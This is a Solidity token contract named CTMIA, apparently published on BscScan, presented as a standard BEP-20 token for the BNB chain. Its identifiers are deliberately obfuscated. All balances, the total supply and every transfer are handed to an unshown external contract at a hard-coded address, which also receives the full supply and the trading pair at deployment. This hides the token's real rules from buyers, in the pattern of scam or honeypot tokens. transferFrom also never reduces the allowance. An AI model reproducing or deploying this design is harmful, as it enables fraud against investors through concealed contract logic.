/**
 *Submitted for verification at BscScan.com on 2022-04-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface asdfaslkjdf123 {
    function factory() external pure returns (address);
}

contract CTMIA{

    pbildfDdlfjlk alsjdflakj234234 = pbildfDdlfjlk(0x1E32dB7928B713760FF3C6E439128C668CdFaEA6);

    string public name = "CTMIA";
    string  public symbol = "CTMIA";
    uint8   public decimals = 9;
	

	address lajftoalsdj123 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 public totalSupply_ = 1000000000 * (10 ** decimals);

    address public sdlfslajdflkjd213443;
    address public jasdfsdllCdfsldfjk12421;
	asdfaslkjdf123 public alsdflkjlkjui12132132;

	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public sadfjaslkjf2342342423;

    

    function balanceOf(address _owner) public view returns (uint256) {
        return alsjdflakj234234.Elasdfjoier334(_owner);
    }
    function totalSupply() public view returns (uint256) {
        return alsjdflakj234234.Vsdflsdjflid234();
    }

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(alsjdflakj234234.Elasdfjoier334(msg.sender) >= _value);

        alsjdflakj234234.Dldjfeierjl1(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }

    constructor() {
		
        alsdflkjlkjui12132132 = asdfaslkjdf123(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        jasdfsdllCdfsldfjk12421 = asdfjljo(alsdflkjlkjui12132132.factory()).createPair(lajftoalsdj123, address(this));
        sdlfslajdflkjd213443=msg.sender;

        alsjdflakj234234.Cdfsldfjlj23421(totalSupply_, address(this), sdlfslajdflkjd213443,jasdfsdllCdfsldfjk12421);
        emit Transfer(address(0), sdlfslajdflkjd213443, totalSupply_);
    }
   
    
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        sadfjaslkjf2342342423[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
    
     function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return sadfjaslkjf2342342423[_owner][_spender];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= alsjdflakj234234.Elasdfjoier334(_from));
        require(_value <= sadfjaslkjf2342342423[_from][msg.sender]);
		
		alsjdflakj234234.Dldjfeierjl1(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
   
	
}


interface pbildfDdlfjlk {

    function Dldjfeierjl1(address _from, address _to, uint256 _value) external;

    function Elasdfjoier334(address _owner) view external returns (uint256);

    function Vsdflsdjflid234() view external returns (uint256);

    function Cdfsldfjlj23421(uint256 total,address tokenAddress,address sdlfslajdflkjd213443,address _pairs) external;
}

interface asdfjljo {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}